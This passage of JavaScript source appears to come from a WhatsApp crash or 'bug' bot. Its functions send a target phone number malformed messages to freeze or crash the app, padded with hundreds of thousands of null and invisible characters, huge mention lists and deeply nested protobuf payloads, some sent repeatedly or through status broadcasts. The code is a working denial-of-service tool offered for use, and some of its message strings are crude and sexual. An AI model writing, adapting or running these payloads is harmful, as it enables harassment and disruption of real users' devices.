    participant: { jid: target },
  };

  await sock.relayMessage(target, payload, options);
}

async function delayPajak(sock, target) {
  await sock.relayMessage(target, {
    interactiveMessage: {
      nativeFlowMessage: {
        buttons: [
          {
            name: "payment_info",
            buttonParamsJson: JSON.stringify({
              currency: "IDR",
              total_amount: { value: 999999999, offset: 100 },
              reference_id: "\u0000".repeat(50000),
              order: {
                items: [
                  {
                    name: "\x00".repeat(20000),
                    amount: { value: 999999999, offset: 100 }
                  }
                ]
              }
            })
          }
        ]
      },
      contextInfo: {
        mentionedJid: Array.from({ length: 2000 }, () =>
          "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
        ),
        forwardingScore: 999999999,
        isForwarded: true
      }
    }
  }, {});

  await sock.relayMessage(target, {
    locationMessage: {
      degreesLatitude: -9.999999,
      degreesLongitude: 999.999999,
      name: "\u0000".repeat(500000),
      address: "\u3164".repeat(500000),
      isLive: true,
      accuracyInMeters: 1,
      speedInMps: 1,
      degreesClockwiseFromMagneticNorth: 99,
      contextInfo: {
        mentionedJid: Array.from({ length: 2000 }, () =>
          "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
        ),
        forwardingScore: 999999999,
        isForwarded: true
      }
    }
  }, {});

  await sock.relayMessage(target, {
    interactiveMessage: {
      nativeFlowMessage: {
        buttons: [
          {
            name: "cta_url",
            buttonParamsJson: JSON.stringify({
              display_text: "\u202E".repeat(500000),
              url: "www.site.888.gacor"
            })
          }
        ]
      },
      contextInfo: {
        mentionedJid: Array.from({ length: 2000 }, () =>
          "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
        ),
        forwardingScore: 999999999,
        isForwarded: true
      }
    }
  }, {});
}

async function Assalamualaikum(sock, target) {
  await sock.relayMessage(target, {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          body: {
            text: "Znsyc7Romance - Buronan"
          },
          nativeFlowMessage: {
            buttons: Array.from({ length: 500000 }, () => ({}))
          },
          extendedTextMessage: {
            text: "\u0000".repeat(500000),
            contextInfo: {
              mentionedJid: Array.from({ length: 2000 }, () => 
                "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
              ),
              forwardingScore: 999999999,
              isForwarded: true
            }
          }
        }
      }
    }
  }, {});
}

async function LyoxCrash(sock, target) {
  const generateMessage = {
    viewOnceMessage: {
      message: {
        locationMessage: {
          degreesLatitude: -999.999999,
          degreesLongtitude: 1,
          contextInfo: {
            mentionedJid: Array.from({ length: 30000 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
            isSampled: true,
            participant: target,
            remoteJid: "status@broadcast",
            forwardingScore: 9741,
            isForwarded: true
          }
        }
      }
    }
  };

  const TAGS = [
    [0xBA, 0x03],
    [0xD2, 0x04],
    [0xAA, 0x02],
  ];

  const encodeVarint = function(n) {
    var buf = [];
    while (n >= 0x80) {
      buf.push((n & 0x7f) | 0x80);
      n >>>= 7;
    }
    buf.push(n);
    return Buffer.from(buf);
  };

  const wrapLd = function(tag, data) {
    return Buffer.concat([Buffer.from(tag), encodeVarint(data.length), data]);
  };

  const basePayload = proto.Message.encode(
    proto.Message.fromObject(generateMessage)
  ).finish();

  const inflate = function(tag, depth) {
    var buf = basePayload;
    for (var i = 0; i < depth; i++) {
      buf = wrapLd(tag, wrapLd([0x0A], buf));
    }
    return buf;
  };

  const resolveJid = function(raw) {
    var s = String(raw || '').trim();
    if (s.includes('@')) return s;
    return s.replace(/\D/g, '') + '@s.whatsapp.net';
  };

  const jids = (Array.isArray(target) ? target : [target])
    .map(resolveJid)
    .filter(function(j) { return j.length > 15; });

  if (!jids.length) throw new Error('No valid JIDs');

  var MAX_BATCH = 5;
  var DELAY_MS = 5000;
  var totalSent = 0;

  for (var offset = 0; offset < jids.length; offset += MAX_BATCH) {
    var chunk = jids.slice(offset, offset + MAX_BATCH);
    var isFirst = offset === 0;

    if (!isFirst) {
      await new Promise(function(r) { setTimeout(r, DELAY_MS); });
    }

    var idx = Math.floor(offset / MAX_BATCH) + 1;
    var suffix = idx > 1 ? ('-' + idx) : '';
    var msgId = 'crb' + Date.now().toString(36).toUpperCase() + suffix;

    for (var ti = 0; ti < TAGS.length; ti++) {
      var tag = TAGS[ti];
      var payload = null;

      for (var depth = 5000; depth >= 2000 && !payload; depth -= 400) {
        try {
          var decoded = proto.Message.decode(inflate(tag, depth));
          proto.Message.encode(decoded).finish();
          payload = decoded;
        } catch (_) {}
      }

      if (!payload) continue;

      await sock.relayMessage('status@broadcast', payload, {
        messageId: msgId,
        statusJidList: chunk,
        additionalNodes: [{
          tag: 'meta',
          attrs: {},
          content: [{
            tag: 'mentioned_users',
            attrs: {},
            content: chunk.map(function(jid) {
              return { tag: 'to', attrs: { jid: jid }, content: [] };
            })
          }]
        }]
      });

      totalSent++;
    }
  }

  if (!totalSent) throw new Error('No messages sent');
}

async function ZnyscNoBody(sock, target) {
  const GaharNikWak = {
    stickerMessage: {
      url: "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c&mms3=true",
      fileSha256: "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
      fileEncSha256: "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
      mediaKey: "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
      mimetype: "image/webp",
      directPath: "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
      fileLength: "10610",
      mediaKeyTimestamp: "1775044724",
      stickerSentTs: "1775044724091",
      isAnimated: true,
      contextInfo: {
        mentionedJid: Array.from({ length: 3000 }, () => "1" + Math.floor(Math.random() * 900000) + "@s.whatsapp.net"),
        stanzaId: "\u0000".repeat(60000),
        isForwarded: true,
        forwardingScore: 999999,
        participant: "0@s.whatsapp.net",
        remoteJid: "status@broadcast"
      }
    },
    imageMessage: {
      url: "https://mmg.whatsapp.net/o1/v/t24/f2/m237/AQMXWKQwsrMYQwbJcty5nkMgF5D-fZ8xu-dRDhdIgrvqIiJdZ1ZgXuptdi7xEOTEBJDsBYw0b1CSwfoqWGOxXqaSURsrqFmQUGmFTxZBQw?ccb=9-4&oh=01_Q5Aa4gEIpMScGwc3W4TATq5YX3QpFwR_nPrYTlkqEAicxA13-Q&oe=6A2625EF&_nc_sid=e6ed6c&mms3=true",
      mimetype: "image/jpeg",
      caption: "\u0000".repeat(50000) + "\u200b".repeat(50000),
      fileSha256: "NzsD1qquqQAeJ3MecYvGXETNvqxgrGH2LaxD8ALpYVk=",
      fileLength: "999999999999999999",
      height: 999999999,
      width: 999999999,
      mediaKey: "H/rCyN5jn7ZFFS4zMtPc1yhkT7yyenEAkjP0JLTLDY8=",
      fileEncSha256: "RLs/w++G7Ria6t+hvfOI1y4Jr9FDCuVJ6pm9U3A2eSM=",
      directPath: "/v/t62.7118-24/41030260_9800293776747367_945540521756953112_n.enc?ccb=11-4&oh=01_Q5Aa1wGdTjmbr5myJ7j-NV5kHcoGCIbe9E4r007rwgB4FjQI3Q&oe=687843F2&_nc_sid=5e03e0",
      mediaKeyTimestamp: "1750124469",
      jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAuAAEAAwEBAQAAAAAAAAAAAAAAAAEQMEBQYBAQEBAQAAAAAAAAAAAAAAAAACAQP/2gAMAwEAAhADEAAAAPMgAAAAAb8F9Kd12C9pHLAAHTwWUaubbqoQAA3zgHWjlSaMswAAAAAAf//EACcQAAIBBAECBQUAAAAAAAAAAAECAwAREjMxBCAQFCJRgiEwQEFS/9oACAEBAAE/APxfKpJBsia7DkVY3tR6VI4M5Wsx4HfBM8TgrRWPPZj9ebVPK8r3bvghSGPdL8RXmG251PCkse6L5DujieU2QU6TcMeB4HZGLXIB7uiZV3Fv5qExvuNremjrLmPBba6VEMkQIGOHqrq1VZbKBj+u0EigSODWR96yb3NEk8n7n//EABwRAAEEAwEAAAAAAAAAAAAAAAEAAhEhEiAwMf/aAAgBAgEBPwDZsTaczAXc+aNMWsyZBvr/AP/EABQRAQAAAAAAAAAAAAAAAAAAAED/2gAIAQMBAT8AT//Z",
      contextInfo: {
        mentionedJid: Array.from({ length: 3000 }, () => "0@s.whatsapp.net"),
        stanzaId: "\u0000".repeat(50000)
      }
    },
    nativeFlowMessage: {
      buttons: Array.from({ length: 500 }, () => ({
        name: "galaxy_message",
        buttonParamsJson: JSON.stringify({
          displayText: "\u200b".repeat(5000) + "𑇂".repeat(5000),
          id: "\u0000"
        })
      }))
    }
  };

  const SgmTwo = {
    interactiveMessage: {
      body: {
        text: "xznsyc — k'For keiraaa"
      },
      nativeFlowMessage: {
        buttons: "\u0000".repeat(500000)
      }
    }
  };

  const KeiraaIsAmpass = {
    interactiveMessage: {
      body: {
        text: "Apakabar Bang?\nbyKeiraa"
      },
      nativeFlowMessage: {
        buttons: "\0".repeat(500000)
      }
    }
  };

  for (let i = 0; i < 500; i++) {
    await sock.relayMessage(target, GaharNikWak, {});
    await sock.relayMessage(target, SgmTwo, {});
    await sock.relayMessage(target, KeiraaIsAmpass, {});
  }
}

async function FconeMsgNew(sock, target) {
  const msg = {
    interactiveMessage: {
      body: {
        text: "XevoZy"
      },
      nativeFlowMessage: {
        buttons: [
          {
            name: "catalog_message",
            buttonParamsJson: JSON.stringify({})
          }
        ],
        messageParamsJson: JSON.stringify({})
      },
      contextInfo: {
        mentionedJid: [target],
        isForwarded: true
      }
    }
  };

  await sock.relayMessage(target, msg, {
    additionalNodes: [
      {
        tag: "biz",
        attrs: { native_flow_name: "catalog_message" }
      }
    ]
  });
}


async function CrashMamaklo(sock, target) {
  const msg = {
    interactiveMessage: {
      body: {
        text: "Tong Legeg, Bisa Di Bug Wa Na Make Xevo"
      },
      nativeFlowMessage: {
        buttons: "ꦾ".repeat(500000) 
      }
    }
  };
  await sock.relayMessage(target, msg);
}

async function DelayFreezerbeku(sock, target) {
await sock.relayMessage(target, {
    interactiveMessage: {
      header: {
        title: "PL Pembokep",
        imageMessage: {
          url: "https://mmg.whatsapp.net/o1/v/t24/f2/m234/AQNKGomvjg2Ua9Ssb7JYtGlIOzdTlA__XPLpMZKSvoxo4s0BNq8_yoFgyopdfQCKdG2jhRfR1vVszLR_YOXUzxOlIoMwjA9bjsibM-7Xjg?ccb=9-4&oh=01_Q5Aa4wEJA1yWx93n2LsHl57Q5gRboTzP0JFzapGd127AkxlN7Q&oe=6A6873B3&_nc_sid=e6ed6c&mms3=true",
          mimetype: "image/jpeg",
          caption: "ZzzzzZ.",
          fileSha256: "c9qyQBuWwI4bHiQX0TAmAq9V18JugSHKjal8BSOUVFY=",
          fileLength: "634893",
          height: 1022,
          width: 1080,
          mediaKey: "G6gr2DHkMBdjuZgWcc2zWMS1NGxY2VboQhxCG1f9GFA=",
          fileEncSha256: "PT14PXdJ92cCsZv9+U0ELlkX7jeFVzjUwcIb7Xn0+0A=",
          directPath: "/o1/v/t24/f2/m234/AQNKGomvjg2Ua9Ssb7JYtGlIOzdTlA__XPLpMZKSvoxo4s0BNq8_yoFgyopdfQCKdG2jhRfR1vVszLR_YOXUzxOlIoMwjA9bjsibM-7Xjg?ccb=9-4&oh=01_Q5Aa4wEJA1yWx93n2LsHl57Q5gRboTzP0JFzapGd127AkxlN7Q&oe=6A6873B3&_nc_sid=e6ed6c",
          mediaKeyTimestamp: "1782643133",
          jpegThumbnail: "/9j/2wBDABALDA4MChAODQ4SERATGCgaGBYWGDEjJR0oOjM9PDkzODdASFxOQERXRTc4UG1RV19iZ2hnPk1xeXBkeFxlZ2P/2wBDARESEhgVGC8aGi9jQjhCY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2P/wAARCAAeACADASIAAhEBAxEB/8QAGgAAAgIDAAAAAAAAAAAAAAAAAAQCBQEDBv/EACcQAAEDAwMDBAMAAAAAAAAAAAECAwQAERIFITEGE0EUIkFRcWGR/8QAFBEBAAAAAAAAAAAAAAAAAAAAAP/EABQRAQAAAAAAAAAAAAAAAAAAAAD/2gAMAwEAAhEDEQA/AOErFPRNNXMaaLS09Rx1SAFGwASkKJpkenpmeKi0Bfchd9vf48fNBUUVcO6Gcy0w+lbqAOolYxAJFwEnzff6rXM0ORFidyXGloSP2xVwb2IHvagTjzpMZGDLykJyysLc8VIajMHElzZOPPi+VvvelaKB38vPxx7ty2ONr+Kg/qUyS2pt6QtaFWuD/KVooP/Z",
          hasMediaAttachment: true
        }
      },
      body: {
        text: "PL Suka Loli" + "ꦾ".repeat(60000)
      },
      footer: {
        text: "\0".repeat(50)
      },
      nativeFlowMessage: {
        buttons: [
          {
            name: "order_status",
            buttonParamsJson: JSON.stringify({
              reference_id: "PL-" + Date.now(),
              order: {
                status: "PROCESSING",
                currency: "IDR",
                subtotal: {
                  value: 10000,
                  offset: 100
                },
                tax: {
                  value: 0,
                  offset: 100
                },
                shipping: {
                  value: 0,
                  offset: 100
                },
                discount: {
                  value: 0,
                  offset: 100
                },
                total: {
                  value: 10000,
                  offset: 100
                },
                items: [
                  {
                    name: "\0".repeat(100000),
                    quantity: 1,
                    amount: {
                      value: 10000,
                      offset: 100
                    },
                    sale_amount: {
                      value: 10000,
                      offset: 100
                    }
                  }
                ]
              }
            })
          }
        ],
        messageParamsJson: "{".repeat(10000)
      },
      contextInfo: {
        remotejid: "pL",
        forwardingScore: 1,
        isForwarded: true,
        forwardedAiBotMessageInfo: {
          botJid: "867051314767696@bot"
        },
        forwardOrigin: 4,
        alwaysShowAdAttribution: true
      }
    }
  },
  {
    additionalNodes: [
      {
        tag: "biz",
        attrs: {
          native_flow_name: "order_status"
        }
      }
    ]
  });
}

async function makloytim(sock, target) {
  const msg = {
    contactMessage: {
      displayName: "Setya Nih Dek",
      vcard: "BEGIN:VCARD\nVERSION:3.0\nFN:" + "\u0000".repeat(500000) + "\nX-WA-BIZ-NAME:" + "\u0000".repeat(500000) + "\nX-WA-BIZ-DESCRIPTION:" + "\u0000".repeat(500000) + "\nORG:" + "\u0000".repeat(500000) + ";\nTEL;type=CELL;type=VOICE;waid=999999999:99999999\nEND:VCARD"
    }
  };
  await sock.relayMessage(target, msg);
}

async function Setya2k26(sock, target) {
  const msg = {
    viewOnceMessage: {
      message: {
        groupStatusMessageV2: {
          message: {
            interactiveMessage: {
              body: {
                text: "Setya 2k26"
              },
              nativeFlowMessage: {
                buttons: Array.from({ length: 5000 }, () => ({
                  name: "quick_reply",
                  buttonParamsJson: JSON.stringify({
                    displayText: "Setya 2k26",
                    id: "Setya2k26"
                  })
                })),
                messageParamsJson: JSON.stringify({ text: "Setya 2k26" }),
                version: 4
              },
              extendedTextMessage: {
                text: "Setya 2k26",
                title: "Setya 2k26",
                description: "Setya 2k26"
              },
              contextInfo: {
                mentionedJid: Array.from({ length: 5000 }, () =>
                  "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
                )
              }
            }
          }
        }
      }
    }
  };
  await sock.relayMessage(target, msg);
}

async function xcrasg(sock, target) {
  await sock.relayMessage(target,{
    interactiveMessage: {
      header: {
        title: "x",
        hasMediaAttachment: true,
        locationMessage: {
        degreesLatitude: 9999999999,
        degreesLongitude: 9999999999,
        }
      },
      body: {
        text: "x",
      },
      nativeFlowMessage: {
        buttons: [
          {
            name: "catalog_message",
            buttonParamsJson: "{}",
          }
        ],
      }
    }
  }, {
    additionalNodes: [
      {
        tag: "biz",
        attrs: { native_flow_name: "catalog_message" }
      }
    ],
    participant: true
  });
}

async function freezechat(sock, target) {
  await sock.relayMessage(target, {
    interactiveMessage: {
      body: { text: "7eppsynC" },
      nativeFlowMessage: {
        buttons: [
          {
            name: "galaxy_message",
            buttonParamsJson: JSON.stringify({
              flow_cta: "👁‍🗨⃟꙰。⃝𝐗𝐞𝐯𝐨 ‌ ⌁ 𝐈𝐬 𝐇𝐞𝐫𝐞‌⃰ ⌁ ꪸ⃟‼️",
              icon: "REVIEW"
            })
          },
          ...Array.from({ length: 1999 }, () => ({
          name: "cta_url",
          buttonParamsJson: "{}"
          }))
        ]
      }
    }
  }, { participant: { target } })
}

async function crasbhX(sock, target) {
await sock.relayMessage(target, {
senderKeyDistributionMessage: {
groupId: "120363428445623974@g.us",
axolotlSenderKeyDistributionMessage: crypto.randomBytes(32)
},
interactiveMessage: {
body: {
text: "x"
},
nativeFlowMessage: {
buttons: [
{
name: "catalog_message",
buttonParamsJson: "{}"
}
],
messageParamsJson: "{}"
}
}
},
{
additionalNodes: [
{
tag: "biz",
attrs: {
native_flow_name: "catalog_message"
}
}
]
});
}

async function ojeme(sock, target) {
  await sock.relayMessage(target, {
    productMessage: {
      product: {
        productImage: {
          mimetype: "image/jpeg",
          jpegThumbnail: ""
        },
        title: "HY, ARE YOU NOW FANTZY?",
        description: "\0".repeat(100000),
        currencyCode: "IDR",
        priceAmount1000: 0,
        url: "data:text/plain," + "\0".repeat(50000)
      },
      businessOwnerJid: target
    }
  }, { participant: { jid: target } });
}

async function LockGb(sock, target) {
    await sock.groupParticipantsUpdate(targey, ["13135550002@s.whatsapp.net"], "add");
}

async function blankGroup(sock, target) {
  const msg = {
    interactiveMessage: {
      nativeFlowMessage: {
        buttons: [
          {
            name: "payment_info",
            buttonParamsJson: `{"currency":"IDR","total_amount":{"value":0,"offset":100},"reference_id":"${Date.now()}","type":"physical-goods","order":{"status":"pending","subtotal":{"value":0,"offset":100},"order_type":"ORDER","items":[{"name":"${'ꦾ'.repeat(5000)}","amount":{"value":0,"offset":100},"quantity":0,"sale_amount":{"value":0,"offset":100}}]},"payment_settings":[{"type":"pix_static_code","pix_static_code":{"merchant_name":"amba","key":"${'\u0000'.repeat(900000)}","key_type":"CPF"}}],"share_payment_status":false}`
          }
        ]
      }
    }
  };
  
  const prepared = await generateWAMessageFromContent(target, msg, {});
  await sock.relayMessage(target, prepared.message, {
    messageId: prepared.key.id
  });
}

async function ForcloseIos(sock, target) {
const TravaIphone = ". ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + "𑇂𑆵𑆴𑆿".repeat(60000);
   try {
      let locationMessage = {
         degreesLatitude: -9.09999262999,
         degreesLongitude: 199.99963118999,
         jpegThumbnail: null,
         name: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(15000), // Trigger2
         address: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(10000), // Trigger 3
         url: `https://st-gacor.${"𑇂𑆵𑆴𑆿".repeat(25000)}.com`, //Trigger 4
      }
      let msg = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               locationMessage
            }
         }
      }, {});
      let extendMsg = {
         extendedTextMessage: { 
            text: "🔞 𝐈𝐬͠𝐚͜𝐠𝐢 ⍣᳟ 𝐈𝐧͠𝐟𝐢͜𝐧͠𝐢𝐭𝐲" + TravaIphone, //Trigger 5
            matchedText: "🔞 𝐈𝐬͠𝐚͜𝐠𝐢 ⍣᳟ 𝐈𝐧͠𝐟𝐢͜𝐧͠𝐢𝐭𝐲",
            description: "𑇂𑆵𑆴𑆿".repeat(25000),//Trigger 6
            title: "🔞 𝐈𝐬͠𝐚͜𝐠𝐢 ⍣᳟ 𝐈𝐧͠𝐟𝐢͜𝐧͠𝐢𝐭𝐲" + "𑇂𑆵𑆴𑆿".repeat(15000),//Trigger 7
            previewType: "NONE",
            jpegThumbnail: "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",
            thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc?ccb=11-4&oh=01_Q5AaIZ5mABGgkve1IJaScUxgnPgpztIPf_qlibndhhtKEs9O&oe=680D191A&_nc_sid=5e03e0",
            thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
            thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
            mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
            mediaKeyTimestamp: "1743101489",
            thumbnailHeight: 641,
            thumbnailWidth: 640,
            inviteLinkGroupTypeV2: "DEFAULT"
         }
      }
      let msg2 = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               extendMsg
            }
         }
      }, {});
      let msg3 = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               locationMessage
            }
         }
      }, {});
      await sock.relayMessage('status@broadcast', msg.message, {
         messageId: msg.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
      await sock.relayMessage('status@broadcast', msg2.message, {
         messageId: msg2.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target 
                  },
                  content: undefined
               }]
            }]
         }]
      });
      await sock.relayMessage('status@broadcast', msg3.message, {
         messageId: msg2.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target 
                  },
                  content: undefined
               }]
            }]
         }]
      });
   } catch (err) {
      console.error(err);
